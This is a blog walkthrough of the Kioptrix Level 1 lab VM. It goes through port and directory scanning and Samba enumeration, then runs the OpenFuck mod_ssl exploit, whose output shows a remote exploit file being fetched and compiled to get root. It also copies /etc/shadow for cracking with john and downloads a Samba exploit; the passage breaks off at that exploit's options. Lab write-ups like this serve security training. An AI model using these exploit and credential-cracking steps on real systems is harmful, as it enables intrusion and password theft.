@@ -1,0 +1,529 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Kioptrix Level 1 CTF VM WalkThrough" /><meta name="author" content="Ajay Kumat Tekam" /><meta property="og:locale" content="en_US" /><meta name="description" content="VM : Kioptrix Level 1" /><meta property="og:description" content="VM : Kioptrix Level 1" /><link rel="canonical" href="https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/" /><meta property="og:url" content="https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/" /><meta property="og:site_name" content="Ajay Kumar Tekam" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-06-21T05:45:11+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Kioptrix Level 1 CTF VM WalkThrough" /><meta name="twitter:site" content="@x90ajay" /><meta name="twitter:creator" content="@Ajay Kumat Tekam" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"VM : Kioptrix Level 1","url":"https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/","@type":"BlogPosting","headline":"Kioptrix Level 1 CTF VM WalkThrough","dateModified":"2020-06-21T05:45:11+05:30","datePublished":"2020-06-21T05:45:11+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://ajaytekam.github.io/posts/Level-1-CTF-VM-WalkThrough/"},"author":{"@type":"Person","name":"Ajay Kumat Tekam"},"@context":"https://schema.org"}</script><title>Kioptrix Level 1 CTF VM WalkThrough | Ajay Kumar Tekam</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/33233365?s=460&u=83f149b0c63860593a37a0e0fff6ccdfb224a27e&v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ajay Kumar Tekam</a></div><div class="site-subtitle font-italic">Web-Application & Network Penetration Tester | Bug Hunter</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Ajaytekam" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://linkedin.com/in/ajaytekam" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/x90ajay" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['contact.mtsec','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Kioptrix Level 1 CTF VM WalkThrough</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Kioptrix Level 1 CTF VM WalkThrough</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Jun 21, 2020, 5:45 AM +0530" > Jun 21, 2020 <i class="unloaded">2020-06-21T05:45:11+05:30</i> </span> by <span class="author"> Ajay Kumat Tekam </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1853 words">10 min</span></div></div><div class="post-content"><p><strong>VM : Kioptrix Level 1</strong></p><p>Download Link : https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</p><p><strong>Scanning the whole class A network :</strong></p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sP</span> 192.168.1.0/24
+
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-07 15:45 UTC
+Nmap scan report <span class="k">for </span>192.168.1.1
+Host is up <span class="o">(</span>0.059s latency<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>192.168.1.3
+Host is up <span class="o">(</span>0.000035s latency<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>192.168.1.4
+Host is up <span class="o">(</span>0.081s latency<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>192.168.1.104
+Host is up <span class="o">(</span>0.00051s latency<span class="o">)</span><span class="nb">.</span>
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>4 hosts up<span class="o">)</span> scanned <span class="k">in </span>18.67 seconds
+</pre></table></code></div></div><p>Our target is 192.168.1.104.</p><h3 id="scanning-the-target-">Scanning the target :</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>nmap <span class="nt">-sV</span> <span class="nt">-O</span> 192.168.1.104 <span class="nt">-oN</span> nmap.scan
+
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-04-07 15:58 UTC
+Nmap scan report <span class="k">for </span>192.168.1.104
+Host is up <span class="o">(</span>0.00053s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 994 closed ports
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 2.9p2 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+80/tcp   open  http        Apache httpd 1.3.20 <span class="o">((</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b<span class="o">)</span>
+111/tcp  open  rpcbind     2 <span class="o">(</span>RPC <span class="c">#100000)</span>
+139/tcp  open  netbios-ssn Samba smbd <span class="o">(</span>workgroup: MYGROUP<span class="o">)</span>
+443/tcp  open  ssl/https   Apache/1.3.20 <span class="o">(</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b
+1024/tcp open  status      1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+Device <span class="nb">type</span>: general purpose
+Running: Linux 2.4.X
+OS CPE: cpe:/o:linux:linux_kernel:2.4.7
+OS details: Linux 2.4.7
+Network Distance: 2 hops
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>21.35 seconds
+</pre></table></code></div></div><div class="table-wrapper"><table><tbody><tr><td>Operating System : Linux 2.4.X<td>cpe:/o:linux:linux_kernel:2.4.7<td>Linux 2.4.7</table></div><h3 id="scanning-url-with-dirb">Scanning URL with dirb</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>By The Dark Raver
+<span class="nt">-----------------</span>
+
+OUTPUT_FILE: dirb.scan
+START_TIME: Tue Apr  7 16:35:19 2020
+URL_BASE: http://192.168.1.104/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+<span class="nt">-----------------</span>
+
+GENERATED WORDS: 4612
+
+<span class="nt">----</span> Scanning URL: http://192.168.1.104/ <span class="nt">----</span>
++ http://192.168.1.104/~operator <span class="o">(</span>CODE:403|SIZE:273<span class="o">)</span>
++ http://192.168.1.104/~root <span class="o">(</span>CODE:403|SIZE:269<span class="o">)</span>
++ http://192.168.1.104/cgi-bin/ <span class="o">(</span>CODE:403|SIZE:272<span class="o">)</span>
++ http://192.168.1.104/index.html <span class="o">(</span>CODE:200|SIZE:2890<span class="o">)</span>
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.1.104/manual/
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.1.104/mrtg/
+<span class="o">==&gt;</span> DIRECTORY: http://192.168.1.104/usage/
+
+<span class="nt">----</span> Entering directory: http://192.168.1.104/manual/ <span class="nt">----</span>
+<span class="o">(!)</span> WARNING: Directory IS LISTABLE. No need to scan it.
+    <span class="o">(</span>Use mode <span class="s1">'-w'</span> <span class="k">if </span>you want to scan it anyway<span class="o">)</span>
+
+<span class="nt">----</span> Entering directory: http://192.168.1.104/mrtg/ <span class="nt">----</span>
++ http://192.168.1.104/mrtg/index.html <span class="o">(</span>CODE:200|SIZE:17318<span class="o">)</span>
+
+<span class="nt">----</span> Entering directory: http://192.168.1.104/usage/ <span class="nt">----</span>
++ http://192.168.1.104/usage/index.html <span class="o">(</span>CODE:200|SIZE:4810<span class="o">)</span>
+
+<span class="nt">-----------------</span>
+END_TIME: Tue Apr  7 16:35:41 2020
+DOWNLOADED: 13836 - FOUND: 6
+</pre></table></code></div></div><h3 id="scanning-pathfiles-with-dirsearch">Scanning path/files with dirsearch</h3><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre>Extensions: php, asp, aspx, jsp, html, zip, jar, sql | HTTP method: get | Threads: 10 | Wordlist size: 8678
+
+Error Log: /root/tools/dirsearch/logs/errors-20-04-07_17-33-40.log
+
+Target: http://192.168.1.104
+
+<span class="o">[</span>17:33:40] Starting:
+/bin/bash: <span class="o">]</span>: <span class="nb">command </span>not found
+<span class="o">[</span>17:33:41] 403 -  277B  - /.htaccess-dev
+<span class="o">[</span>17:33:41] 403 -  279B  - /.htaccess-local
+<span class="o">[</span>17:33:41] 403 -  268B  - /.hta
+<span class="o">[</span>17:33:41] 403 -  277B  - /.htaccess.BAK
+<span class="o">[</span>17:33:41] 403 -  279B  - /.htaccess-marco
+<span class="o">[</span>17:33:41] 403 -  278B  - /.htaccess.bak1
+<span class="o">[</span>17:33:41] 403 -  278B  - /.htaccess.orig
+<span class="o">[</span>17:33:41] 403 -  277B  - /.htaccess.old
+<span class="o">[</span>17:33:41] 403 -  278B  - /.htaccess.save
+<span class="o">[</span>17:33:41] 403 -  277B  - /.htaccess.txt
+<span class="o">[</span>17:33:41] 403 -  280B  - /.htaccess.sample
+<span class="o">[</span>17:33:41] 403 -  279B  - /.htaccess_extra
+<span class="o">[</span>17:33:41] 403 -  276B  - /.htaccess_sc
+<span class="o">[</span>17:33:41] 403 -  278B  - /.htaccess_orig
+<span class="o">[</span>17:33:41] 403 -  276B  - /.htaccessBAK
+<span class="o">[</span>17:33:41] 403 -  276B  - /.htaccessOLD
+<span class="o">[</span>17:33:41] 403 -  277B  - /.htaccessOLD2
+<span class="o">[</span>17:33:41] 403 -  274B  - /.htaccess~
+<span class="o">[</span>17:33:41] 403 -  272B  - /.htgroup
+<span class="o">[</span>17:33:41] 403 -  277B  - /.htpasswd-old
+<span class="o">[</span>17:33:41] 403 -  278B  - /.htpasswd_test
+<span class="o">[</span>17:33:41] 403 -  274B  - /.htpasswds
+<span class="o">[</span>17:33:41] 403 -  272B  - /.htusers
+<span class="o">[</span>17:33:48] 403 -  272B  - /cgi-bin/
+<span class="o">[</span>17:33:49] 403 -  268B  - /doc/
+<span class="o">[</span>17:33:49] 403 -  282B  - /doc/stable.version
+<span class="o">[</span>17:33:49] 403 -  283B  - /doc/en/changes.html
+<span class="o">[</span>17:33:51] 200 -    3KB - /index.html
+<span class="o">[</span>17:33:52] 301 -  294B  - /manual  -&gt;  http://127.0.0.1/manual/
+<span class="o">[</span>17:33:56] 200 -   27B  - /test.php
+<span class="o">[</span>17:33:57] 200 -    5KB - /usage/
+
+Task Completed
+</pre></table></code></div></div><p>Findings :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre><span class="o">[</span>17:33:51] 200 -    3KB - /index.html
+<span class="o">[</span>17:33:56] 200 -   27B  - /test.php
+<span class="o">[</span>17:33:57] 200 -    5KB - /usage/
+</pre></table></code></div></div><p>Now at the <code class="language-plaintext highlighter-rouge">http://192.168.1.104/usage/</code> there is Webalizer Version 2.01 created page, and search for the gives “Webalizer 2.1.x Buffer Overflow vulnerabilty” which Allows Remote Users to Execute Arbitrary Code on the Server via Reverse DNS Lookups. But i didn’t find any exploit for that. However there is an XSS vulnerability. To exploit this just send a curl request and attach payload on the referrer header which can be added to the http://192.168.1.104/usage/usage_DATE.html page. But this is not much useful.</p><p>Now try to exploit findings from nmap, which are :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>22/tcp   open  ssh         OpenSSH 2.9p2 <span class="o">(</span>protocol 1.99<span class="o">)</span>
+80/tcp   open  http        Apache httpd 1.3.20 <span class="o">((</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b<span class="o">)</span>
+111/tcp  open  rpcbind     2 <span class="o">(</span>RPC <span class="c">#100000)</span>
+139/tcp  open  netbios-ssn Samba smbd <span class="o">(</span>workgroup: MYGROUP<span class="o">)</span>
+443/tcp  open  ssl/https   Apache/1.3.20 <span class="o">(</span>Unix<span class="o">)</span>  <span class="o">(</span>Red-Hat/Linux<span class="o">)</span> mod_ssl/2.8.4 OpenSSL/0.9.6b
+1024/tcp open  status      1 <span class="o">(</span>RPC <span class="c">#100024)</span>
+</pre></table></code></div></div><h3 id="searching-for-apache-1320">Searching for <code class="language-plaintext highlighter-rouge">Apache 1.3.20</code></h3><p>The above search lead to <code class="language-plaintext highlighter-rouge">Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow</code> and we can see that in our target server the ssl server version is 2.8.4 so we can try to exploit this buffer overflow. The exploit can be found at here : https://www.exploit-db.com/exploits/47080 (newer version). so first we download the exploit and follow the instruction given on that page :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>./OpenFuck | <span class="nb">grep </span>1.3.20 | <span class="nb">grep </span>RedHat
+    0x6a - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.20-16<span class="o">)</span>1
+    0x6b - RedHat Linux 7.2 <span class="o">(</span>apache-1.3.20-16<span class="o">)</span>2
+
+<span class="nv">$ </span>./OpenFuck 0x6b 192.168.1.104 443 <span class="nt">-c</span> 40
+
+<span class="k">*******************************************************************</span>
+<span class="k">*</span> OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open <span class="k">*</span>
+<span class="k">*******************************************************************</span>
+<span class="k">*</span> by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE <span class="k">*</span>
+<span class="k">*</span> <span class="c">#hackarena  irc.brasnet.org                                     *</span>
+<span class="k">*</span> TNX Xanthic USG <span class="c">#SilverLords #BloodBR #isotk #highsecure #uname *</span>
+<span class="k">*</span> <span class="c">#ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</span>
+<span class="k">*</span> <span class="c">#pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</span>
+<span class="k">*******************************************************************</span>
+
+Connection... 40 of 40
+Establishing SSL connection
+cipher: 0x4043808c   ciphers: 0x80f8088
+Ready to send shellcode
+Spawning shell...
+bash: no job control <span class="k">in </span>this shell
+bash-2.05<span class="err">$</span>
+d.c<span class="p">;</span> ./exploit<span class="p">;</span> <span class="nt">-kmod</span>.c<span class="p">;</span> gcc <span class="nt">-o</span> exploit ptrace-kmod.c <span class="nt">-B</span> /usr/bin<span class="p">;</span> <span class="nb">rm </span>ptrace-kmo
+<span class="nt">--15</span>:11:51--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
+           <span class="o">=&gt;</span> <span class="sb">`</span>ptrace-kmod.c<span class="s1">'
+Connecting to dl.packetstormsecurity.net:443... connected!
+HTTP request sent, awaiting response... 200 OK
+Length: 3,921 [text/x-csrc]
+
+    0K ...                                                   100% @   3.74 MB/s
+
+15:11:53 (1.87 MB/s) - `ptrace-kmod.c'</span> saved <span class="o">[</span>3921/3921]
+
+/usr/bin/ld: cannot open output file exploit: Permission denied
+collect2: ld returned 1 <span class="nb">exit </span>status
+gcc: file path prefix <span class="sb">`</span>/usr/bin<span class="s1">' never used
+ls
+exploit
+whoami
+root
+</span></pre></table></code></div></div><p>Try 2 to 3 times if exploit does not work (because the payload download a file “ptrace-kmod.c” from internet). We can get a root shell. Now from here we can get /etc/shadow and /etc/passwd file. Copy them on the system and try to crack the passwords of users with john.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>unshadow passwdfile shadowfile <span class="o">&gt;</span> crack.passwd.db
+<span class="nv">$ </span>john crack.passwd.db
+</pre></table></code></div></div><h3 id="samba-service-">samba service :</h3><p>There is also samba service is running, (revealed by nmap scan). Now enumerating samba service :</p><p>with nbtscan :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>nbtscan 192.168.1.104
+Doing NBT name scan <span class="k">for </span>addresses from 192.168.1.104
+
+IP address       NetBIOS Name     Server    User             MAC address
+<span class="nt">------------------------------------------------------------------------------</span>
+192.168.1.104    KIOPTRIX         &lt;server&gt;  KIOPTRIX         00:00:00:00:00:00
+</pre></table></code></div></div><p>with enum4linux :</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+</pre><td class="rouge-code"><pre>./enum4linux.pl 192.168.1.104
+WARNING: polenum.py is not <span class="k">in </span>your path.  Check that package is installed and your PATH is sane.
+Starting enum4linux v0.8.9 <span class="o">(</span> http://labs.portcullis.co.uk/application/enum4linux/ <span class="o">)</span> on Tue Apr  7 20:29:41 2020
+
+ <span class="o">==========================</span>
+|    Target Information    |
+ <span class="o">==========================</span>
+Target ........... 192.168.1.104
+RID Range ........ 500-550,1000-1050
+Username ......... <span class="s1">''</span>
+Password ......... <span class="s1">''</span>
+Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
+
+
+ <span class="o">=====================================================</span>
+|    Enumerating Workgroup/Domain on 192.168.1.104    |
+ <span class="o">=====================================================</span>
+<span class="o">[</span>+] Got domain/workgroup name: MYGROUP
+
+ <span class="o">=============================================</span>
+|    Nbtstat Information <span class="k">for </span>192.168.1.104    |
+ <span class="o">=============================================</span>
+Looking up status of 192.168.1.104
+    KIOPTRIX        &lt;00&gt; -         B &lt;ACTIVE&gt;  Workstation Service
+    KIOPTRIX        &lt;03&gt; -         B &lt;ACTIVE&gt;  Messenger Service
+    KIOPTRIX        &lt;20&gt; -         B &lt;ACTIVE&gt;  File Server Service
+    ..__MSBROWSE__. &lt;01&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Master Browser
+    MYGROUP         &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Domain/Workgroup Name
+    MYGROUP         &lt;1d&gt; -         B &lt;ACTIVE&gt;  Master Browser
+    MYGROUP         &lt;1e&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt;  Browser Service Elections
+
+    MAC Address <span class="o">=</span> 00-00-00-00-00-00
+
+ <span class="o">======================================</span>
+|    Session Check on 192.168.1.104    |
+ <span class="o">======================================</span>
+<span class="o">[</span>E] Server doesn<span class="s1">'t allow session using username '', password ''.  Aborting remainder of tests.
+</span></pre></table></code></div></div><p>Unfortunately the above scan did not gave the version of samba so i am going to use metasploit auxiliary module to get the samba version</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> search scanner/smb
+msf5 <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_version
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_version<span class="o">)</span> <span class="o">&gt;</span> show options
+
+Module options <span class="o">(</span>auxiliary/scanner/smb/smb_version<span class="o">)</span>:
+
+   Name       Current Setting  Required  Description
+   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   RHOSTS                      <span class="nb">yes       </span>The target address range or CIDR identifier
+   SMBDomain  <span class="nb">.</span>                no        The Windows domain to use <span class="k">for </span>authentication
+   SMBPass                     no        The password <span class="k">for </span>the specified username
+   SMBUser                     no        The username to authenticate as
+   THREADS    1                <span class="nb">yes       </span>The number of concurrent threads
+
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_version<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 192.168.1.104
+RHOSTS <span class="o">=&gt;</span> 192.168.1.104
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_version<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.104:139     - Host could not be identified: Unix <span class="o">(</span>Samba 2.2.1a<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> 192.168.1.104:445     - Scanned 1 of 1 hosts <span class="o">(</span>100% <span class="nb">complete</span><span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Auxiliary module execution completed
+</pre></table></code></div></div><p>The version of samba version is samba 2.2.1a, now by searching “samba 2.2.1a vulnerability” i found “Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution” exploit at https://www.exploit-db.com/exploits/10</p><p>Now from here download and try the exploit.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+</pre><td class="rouge-code"><pre><span class="nv">$ </span>wget https://www.exploit-db.com/raw/10
+<span class="nv">$ </span><span class="nb">mv </span>10 sambal.c
+<span class="nv">$ </span>gcc <span class="nt">-o</span> sambal sambal.c
+<span class="nv">$ </span>./sambal
+samba-2.2.8 &lt; remote root exploit by eSDee <span class="o">(</span>www.netric.org|be<span class="o">)</span>
+<span class="nt">--------------------------------------------------------------</span>
+Usage: ./sambal <span class="o">[</span><span class="nt">-bBcCdfprsStv</span><span class="o">]</span> <span class="o">[</span>host]
+
+<span class="nt">-b</span> &lt;platform&gt;   bruteforce <span class="o">(</span>0 <span class="o">=</span> Linux, 1 <span class="o">=</span> FreeBSD/NetBSD, 2 <span class="o">=</span> OpenBSD 3.1 and prior, 3 <span class="o">=</span> OpenBSD 3.2<span class="o">)</span>
+<span class="nt">-B</span> &lt;step&gt;       bruteforce steps <span class="o">(</span>default <span class="o">=</span> 300<span class="o">)</span>
+<span class="nt">-c</span> &lt;ip address&gt; connectback ip address
